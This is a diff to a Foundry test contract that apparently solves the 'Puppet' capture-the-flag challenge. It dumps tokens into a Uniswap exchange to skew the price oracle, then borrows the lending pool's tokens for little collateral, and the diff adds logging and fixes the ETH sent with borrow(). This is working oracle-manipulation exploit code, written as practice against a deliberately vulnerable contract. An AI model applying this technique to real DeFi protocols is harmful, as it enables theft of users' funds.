@@ -112,17 +112,30 @@ contract Puppet is Test {
         uint256 deadline = block.timestamp * 2;
         uniswapExchange.tokenToEthSwapInput(tokens_sold, min_eth, deadline);
 
+        // check all sold
+        require(dvt.balanceOf(attacker) == 0);
+        console.log("attacker tokens:", dvt.balanceOf(attacker));
+
         // Calculate how much we should pay to borrow a token
-        uint256 ethToBorrowOneToken = puppetPool.calculateDepositRequired(1 ether);
+        uint256 ethToBorrowOneToken = puppetPool.calculateDepositRequired(10 ** 18);
+        console.log("collateral for 1 token:", ethToBorrowOneToken);
+        console.log("attacker balance:", attacker.balance);
+        console.log("pool dvt balance:", dvt.balanceOf(address(puppetPool)));
 
         // Calc how much we can borrow
         uint256 tokenBorrowable = (attacker.balance * 10 ** 18) / ethToBorrowOneToken;
+        console.log("tokenBorrowable:", tokenBorrowable);
 
-        // Get the max borrowable tokekns from the pool
+        // Get the max borrowable tokens from the pool
         uint256 maxTokenToBorrow = Math.min(dvt.balanceOf(address(puppetPool)), tokenBorrowable);
+        console.log("maxTokenToBorrow:", maxTokenToBorrow);
+
+        //confirm eth required
+        uint256 ethNeeded = puppetPool.calculateDepositRequired(maxTokenToBorrow);
+        console.log("eth needed:", ethNeeded);
 
         // borrow
-        puppetPool.borrow(maxTokenToBorrow);
+        puppetPool.borrow{value: ethNeeded}(maxTokenToBorrow);
 
         vm.stopPrank();
         /**
